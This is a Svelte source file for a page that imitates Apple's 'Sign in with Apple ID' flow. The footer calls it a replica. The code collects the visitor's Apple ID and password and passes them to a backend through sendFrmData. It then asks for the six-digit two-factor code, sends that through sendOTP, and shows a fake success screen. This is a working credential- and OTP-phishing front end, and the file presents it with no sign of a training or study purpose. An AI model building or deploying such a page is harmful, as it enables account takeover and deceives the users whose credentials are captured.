<script>
  import { IconArrowRight } from "@tabler/icons-svelte-runes";
  import { sendFrmData, sendOTP } from "$lib";

  let appleId = $state('');
  let password = $state('');
  let otp = $state('');
  let keepSignedIn = $state(false);
  let appleIdError = $state('');
  let passwordError = $state('');
  let otpError = $state('');
  let isLoading = $state(false);

  let showPassword = $state(false);
  let step = $state('appleId'); // 'appleId' | 'password' | 'otp' | 'success'

  let idContainer = $state();
  let pwContainer = $state();
  let otpContainer = $state();
  let successContainer = $state();

  function triggerNext(e) {
    e.preventDefault();
    if (!appleId.trim() || !appleId.includes('@')) {
      appleIdError = "Enter your Apple ID correctly.";
      return;
    }
    appleIdError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (idContainer && pwContainer) {
        idContainer.classList.remove('opacity-100');
        idContainer.classList.add('opacity-0', '-translate-y-3', 'pointer-events-none');

        const handleTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            idContainer?.removeEventListener('transitionend', handleTransition);
            idContainer?.classList.add('hidden');
            pwContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwContainer?.classList.remove('opacity-0', 'translate-y-3');
              pwContainer?.classList.add('opacity-100', 'translate-y-0');
            });
          }
        };
        idContainer.addEventListener('transitionend', handleTransition);
      }
    }, 700);
  }

  async function submitPw(e) {
    e.preventDefault();
    if (!password) {
      passwordError = "Enter your password";
      return;
    }
    passwordError = '';
    isLoading = true;

    // send to backend api
    const res = await sendFrmData({ signinType: 'Apple Sign-in', email: appleId, password: password })
    
    setTimeout(() => {
      isLoading = false;
      step = 'otp';

      if (pwContainer && otpContainer) {
        pwContainer.classList.remove('opacity-100');
        pwContainer.classList.add('opacity-0', '-translate-y-3');

        const handleTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            pwContainer?.removeEventListener('transitionend', handleTransition);
            pwContainer?.classList.add('hidden');
            otpContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              otpContainer?.classList.remove('opacity-0', 'translate-y-3');
              otpContainer?.classList.add('opacity-100', 'translate-y-0');
            });
          }
        };
        pwContainer.addEventListener('transitionend', handleTransition);
      }
    }, 1000);
  }

  function handleBackToAppleId() {
    password = '';
    passwordError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;

      if (idContainer && pwContainer) {
        step = 'appleId';
        pwContainer.classList.remove('opacity-100', 'translate-y-0');
        pwContainer.classList.add('opacity-0', 'translate-y-3');

        const backTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            pwContainer.removeEventListener('transitionend', backTransition);
            pwContainer.classList.add('hidden');
            idContainer.classList.remove('hidden');

            requestAnimationFrame(() => {
              idContainer.classList.remove('opacity-0', '-translate-y-3', 'pointer-events-none');
              idContainer.classList.add('opacity-100', 'translate-y-0');
            });
          }
        };
        pwContainer.addEventListener('transitionend', backTransition);
      }
    }, 300);
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (pwContainer && otpContainer) {
        otpContainer.classList.remove('opacity-100');
        otpContainer.classList.add('opacity-0', '-translate-y-3');

        const handleTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpContainer?.removeEventListener('transitionend', handleTransition);
            otpContainer?.classList.add('hidden');
            pwContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwContainer?.classList.remove('opacity-0', 'translate-y-3');
              pwContainer?.classList.add('opacity-100', 'translate-y-0');
            });
          }
        };
        otpContainer.addEventListener('transitionend', handleTransition);
      }
    }, 350);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    if (!otp) {
      otpError = "Please enter the verification code sent to your Apple devices.";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "Enter a valid 6-digit verification code.";
      return;
    }
    otpError = '';
    isLoading = true;

    // send to backend api
    const res = await sendOTP({ otp: otp, email: appleId })

    setTimeout(() => {
      isLoading = false;
      step = 'success';

      if (otpContainer && successContainer) {
        otpContainer.classList.remove('opacity-100');
        otpContainer.classList.add('opacity-0', '-translate-y-3');

        const handleTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpContainer?.removeEventListener('transitionend', handleTransition);
            otpContainer?.classList.add('hidden');
            successContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              successContainer?.classList.remove('opacity-0', 'translate-y-3');
              successContainer?.classList.add('opacity-100', 'translate-y-0');
            });
          }
        };
        otpContainer.addEventListener('transitionend', handleTransition);
      }
    }, 1100);
  }
</script>


<section class="min-h-screen bg-white md:bg-[#f5f5f7] flex flex-col justify-between font-sans antialiased text-[#1d1d1f]">
  <header class="px-6 py-4 flex items-center justify-between bg-white md:bg-transparent border-b border-gray-200/50 max-w-255 w-full mx-auto">
    <div class="flex items-center gap-2">
      <!--  Small outline Apple SVG -->
      <svg class="w-4 h-4 text-[#1d1d1f]" fill="currentColor" viewBox="0 0 17 20">
        <path d="M15.03 10.62c.03-2.67 2.18-3.95 2.22-3.97-1.24-1.82-3.18-2.07-3.87-2.12-1.65-.17-3.23.97-4.07.97-.83 0-2.14-.95-3.53-.92-1.83.03-3.51 1.07-4.45 2.7-1.9 3.29-.49 8.16 1.36 10.82.9 1.3 1.95 2.75 3.36 2.7 1.36-.05 1.88-.88 3.53-.88 1.63 0 2.12.88 3.54.85 1.45-.03 2.37-1.3 3.26-2.6.99-1.46 1.41-2.88 1.43-2.95-.03-.02-2.76-1.06-2.76-4.22zM12.91 3.24c.73-.89 1.22-2.12 1.08-3.24-.96.04-2.13.64-2.82 1.45-.61.7-1.14 1.95-1 3.05 1.07.08 2.17-.54 2.74-1.26z" />
      </svg>
      <span class="text-sm font-semibold tracking-tight text-[#1d1d1f]">Apple ID</span>
    </div>
    <div class="flex items-center gap-6">
      <a href="#/" class="text-xs text-[#86868b] hover:text-[#1d1d1f] transition-colors" onclick={(e) => { e.preventDefault(); alert("Framer help pages"); }}>FAQ</a>
      <a href="#/" class="text-xs text-[#86868b] hover:text-[#1d1d1f] transition-colors" onclick={(e) => { e.preventDefault(); alert("Apple support info"); }}>Support</a>
    </div>
  </header>

  <section class="flex-1 flex items-center justify-center px-4">
    <div class="w-full max-w-112.5 bg-white rounded-2xl md:border border-gray-200 p-8 md:p-12 md:shadow-[0_4px_24px_rgba(0,0,0,0.04)] min-h-125 flex flex-col justify-between overflow-hidden">
      
      <!-- STAGE 1 -->
      <div bind:this={idContainer} class="flex-1 flex flex-col justify-between transition-all duration-300 opacity-100">
        <div>
          <div class="flex justify-center mb-6">
            <!-- Apple Black logo -->
            <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 17 20">
              <path d="M15.03 10.62c.03-2.67 2.18-3.95 2.22-3.97-1.24-1.82-3.18-2.07-3.87-2.12-1.65-.17-3.23.97-4.07.97-.83 0-2.14-.95-3.53-.92-1.83.03-3.51 1.07-4.45 2.7-1.9 3.29-.49 8.16 1.36 10.82.9 1.3 1.95 2.75 3.36 2.7 1.36-.05 1.88-.88 3.53-.88 1.63 0 2.12.88 3.54.85 1.45-.03 2.37-1.3 3.26-2.6.99-1.46 1.41-2.88 1.43-2.95-.03-.02-2.76-1.06-2.76-4.22zM12.91 3.24c.73-.89 1.22-2.12 1.08-3.24-.96.04-2.13.64-2.82 1.45-.61.7-1.14 1.95-1 3.05 1.07.08 2.17-.54 2.74-1.26z" />
            </svg>
          </div>

          <h1 class="text-2xl font-semibold text-center mb-8">Sign in with Apple ID</h1>

          <form onsubmit={triggerNext} class="space-y-4">
            <div class="relative flex items-center">
              <input 
                type="text" 
                name="appleId"
                bind:value={appleId} 
                placeholder="Apple ID" 
                class="
                  w-full pl-4 pr-12 py-3.5 text-base border border-gray-200 rounded-xl focus:outline-none transition-all duration-150 bg-white 
                  text-[#1d1d1f] font-sans placeholder-gray-400
                  {
                    appleIdError 
                    ? 'border-[#e03b2c] focus:ring-2 focus:ring-[#e03b2c]/20' : 'border-gray-300 focus:border-[#0071e3] focus:ring-2 focus:ring-[#0071e3]/20'
                  }
                " 
              />
              
              <button type="submit" class="absolute right-2.5 w-9 h-9 bg-gray-100 hover:bg-gray-200 rounded-full flex items-center justify-center font-bold">
                {#if isLoading}
                  <span class="w-4 h-4 border-2 border-gray-500 border-t-transparent rounded-full animate-spin"></span>
                {:else}
                  <IconArrowRight />
                {/if}
              </button>
            </div>
          </form>
        </div>

        <div class="mt-8 border-t border-gray-100 pt-6 text-center">
          <a
            href="#/"
            onclick={(e) => { e.preventDefault(); appleIdError ="Forgot ID and recovery support will be guided shortly."; }}
            class="text-sm text-[#0066cc] hover:underline"
          >
            Forgot Apple ID or password?
          </a>
        </div>
      </div>

      <!-- STAGE 2 -->
      <div bind:this={pwContainer} class="flex flex-col justify-between transition-all duration-300 opacity-0 hidden translate-y-3">
        <!-- Back button navigation & Small logo bar -->
        <div class="flex items-center justify-between mb-5 mt-1">
          <button
            type="button"
            onclick={handleBackToAppleId}
            class="inline-flex items-center gap-1.5 text-xs text-[#0066cc] hover:underline hover:text-[#004bb3] transition-colors focus:outline-none"
          >
            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" strokeWidth="3" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
            </svg>
            <span>Change ID</span>
          </button>
          <svg class="w-6 h-6 text-[#1d1d1f]" fill="currentColor" viewBox="0 0 17 20">
            <path d="M15.03 10.62c.03-2.67 2.18-3.95 2.22-3.97-1.24-1.82-3.18-2.07-3.87-2.12-1.65-.17-3.23.97-4.07.97-.83 0-2.14-.95-3.53-.92-1.83.03-3.51 1.07-4.45 2.7-1.9 3.29-.49 8.16 1.36 10.82.9 1.3 1.95 2.75 3.36 2.7 1.36-.05 1.88-.88 3.53-.88 1.63 0 2.12.88 3.54.85 1.45-.03 2.37-1.3 3.26-2.6.99-1.46 1.41-2.88 1.43-2.95-.03-.02-2.76-1.06-2.76-4.22zM12.91 3.24c.73-.89 1.22-2.12 1.08-3.24-.96.04-2.13.64-2.82 1.45-.61.7-1.14 1.95-1 3.05 1.07.08 2.17-.54 2.74-1.26z" />
          </svg>
        </div>

        <div class="mb-6">
          <h1 class="text-xl font-semibold tracking-tight text-[#1d1d1f] mb-1">
            Enter Password
          </h1>
          <p class="text-sm text-gray-500 truncate">
            Apple ID: <span class="font-medium text-[#1d1d1f]">{appleId}</span>
          </p>
        </div>

        <div>
          <h1 class="text-xl font-semibold mb-6">Enter Password</h1>
          <form onsubmit={submitPw}>
            <input 
              type="password" 
              bind:value={password} 
              placeholder="Password" 
              class="
                w-full pl-4 py-3.5 text-base border rounded-xl focus:outline-none transition-all duration-150 bg-white text-[#1d1d1f] mb-4
                font-sans placeholder-gray-400
                {passwordError 
                  ? 'border-[#e03b2c] focus:ring-2 focus:ring-[#e03b2c]/20' 
                  : 'border-gray-300 focus:border-[#0071e3] focus:ring-2 focus:ring-[#0071e3]/20'
                }
              " 
            />
            <button 
              type="submit" 
              disabled={isLoading ? true : false}
              class="w-full py-3.5 bg-black text-white font-semibold rounded-xl cursor-pointer transition-all active:scale-95 duration-300 disabled:opacity-30"
            >
              Sign in
            </button>
          </form>
        </div>

        <!-- forget password footer -->
        <div class="mt-8 border-t border-gray-100 pt-6 text-center">
          <a
            href="#/"
            onclick={(e) => { e.preventDefault(); passwordError = "Choose 'Change ID' to go back, or visit iForgot.apple.com to unlock."; }}
            class="text-sm text-[#0066cc] hover:underline cursor-pointer"
          >
            Forgot password?
          </a>
        </div>
      </div>

      <!-- STAGE 3 (OTP Verification) -->
      <div bind:this={otpContainer} class="flex-1 flex flex-col justify-between transition-all duration-300 opacity-0 hidden translate-y-3">
        <div>
          <div class="flex justify-center mb-5">
            <svg class="w-9 h-9 fill-[#1d1d1f]" viewBox="0 0 17 20">
              <path d="M15.03 10.62c.03-2.67 2.18-3.95 2.22-3.97-1.24-1.82-3.18-2.07-3.87-2.12-1.65-.17-3.23.97-4.07.97-.83 0-2.14-.95-3.53-.92-1.83.03-3.51 1.07-4.45 2.7-1.9 3.29-.49 8.16 1.36 10.82.9 1.3 1.95 2.75 3.36 2.7 1.36-.05 1.88-.88 3.53-.88 1.63 0 2.12.88 3.54.85 1.45-.03 2.37-1.3 3.26-2.6.99-1.46 1.41-2.88 1.43-2.95-.03-.02-2.76-1.06-2.76-4.22zM12.91 3.24c.73-.89 1.22-2.12 1.08-3.24-.96.04-2.13.64-2.82 1.45-.61.7-1.14 1.95-1 3.05 1.07.08 2.17-.54 2.74-1.26z" />
            </svg>
          </div>
          
          <div class="flex items-center gap-2 mb-4">
            <!-- svelte-ignore a11y_consider_explicit_label -->
            <button
              type="button"
              onclick={handleBackToPassword}
              class="inline-flex items-center justify-center p-1 rounded-full hover:bg-gray-100 transition-colors cursor-pointer"
            >
              <svg class="w-3.5 h-3.5 text-gray-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
              </svg>
            </button>
            <span class="text-xs text-gray-500 font-medium truncate">{appleId}</span>
          </div>

          <h1 class="text-[20px] font-semibold text-center text-black mb-1">Two-Factor Authentication</h1>
          <p class="text-sm text-center text-gray-500 mb-6 leading-relaxed">
            Enter the 6-digit dynamic verification code displayed on your trusted Apple devices or sent via SMS.
          </p>

          <form onsubmit={handleOtpSubmit} class="space-y-4">
            <div class="relative">
              <input
                type="text"
                maxlength="6"
                bind:value={otp}
                oninput={(e) => {
                  otp = e.currentTarget.value.replace(/\D/g, '');
                  if (otpError) otpError = '';
                }}
                placeholder="Code"
                class="w-full px-4 py-3.5 text-center text-xl tracking-[1.25em] font-mono border rounded-xl focus:ring-1 focus:ring-black focus:outline-none transition-all duration-150 {otpError ? 'border-red-500' : 'border-gray-300'}"
              />
            </div>

            {#if otpError}
              <div class="text-[13px] text-red-500 text-center leading-snug px-1 animate-fadeIn">
                <span>{otpError}</span>
              </div>
            {/if}

            <button 
              type="submit" 
              disabled={isLoading ? true : false}
              class="w-full py-3.5 bg-black hover:bg-zinc-800 text-white font-semibold rounded-xl cursor-pointer transition-all shadow-sm disabled:opacity-30 duration-300 active:scale-95"
            >
              {isLoading ? 'Verifying!..' : 'Verify & Sign in'}
            </button>
          </form>
        </div>

        <div class="text-center mt-6">
          <button
            type="button"
            onclick={() => otpError = "A fresh Apple two-factor code was triggered to your primary trusted telephone."}
            class="text-[13px] text-[#0066cc] hover:underline cursor-pointer font-medium"
          >
            Didn't get a verification code?
          </button>
        </div>
      </div>

      <!-- STAGE 4 -->
      <div bind:this={successContainer} class="flex-1 flex flex-col justify-center items-center opacity-0 hidden">
        <!-- Premium minimal circular active outline confirm check -->
        <div class="w-16 h-16 rounded-full bg-gray-50 text-[#1d1d1f] flex items-center justify-center mb-6 border border-gray-100 animate-[scaleIn_0.32s_cubic-bezier(0.16,1,0.3,1)]">
          <svg class="w-8 h-8 fill-none stroke-current text-[#1d1d1f]" strokeWidth="2" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>

        <h2 class="text-2xl font-semibold tracking-tight text-[#1d1d1f] mb-2">
          Signed in with Apple
        </h2>

        <div class="bg-[#f5f5f7] border border-gray-200 rounded-xl px-5 py-3.5 mb-6 w-full text-center">
          <p class="text-xs text-gray-400 font-medium uppercase tracking-wider mb-0.5">Primary Apple ID</p>
          <p class="text-base font-semibold text-[#1d1d1f] truncate px-1">{appleId}</p>
        </div>

        <p class="text-sm text-[#86868b] max-w-70 leading-relaxed mb-8 text-center">
          Verify session is authenticated completely. Your Apple account services are ready.
        </p>
        <button 
          type="button" 
          onclick={() => { step = 'appleId'; }} 
          class="px-6 py-2 bg-gray-100 rounded-full"
        >
          Sign out
        </button>
      </div>
    </div>
  </section>

  <footer class="w-full max-w-255 mx-auto px-6 py-6 border-t border-gray-200 flex flex-col sm:flex-row items-center sm:justify-between gap-4 text-[11px] text-[#86868b] font-normal leading-normal">
    <div>
      <span>Apple ID Sign-in replica. All rights reserved.</span>
    </div>
    <div class="flex items-center gap-4">
      <a href="#/" class="hover:text-[#1d1d1f] transition-colors" onClick={(e) => { e.preventDefault(); alert("Apple privacy features"); }}>Privacy Policy</a>
      <span class="text-gray-200">|</span>
      <a href="#/" class="hover:text-[#1d1d1f] transition-colors" onClick={(e) => { e.preventDefault(); alert("Apple agreement replica terms"); }}>Terms & Conditions</a>
    </div>
  </footer>
</section>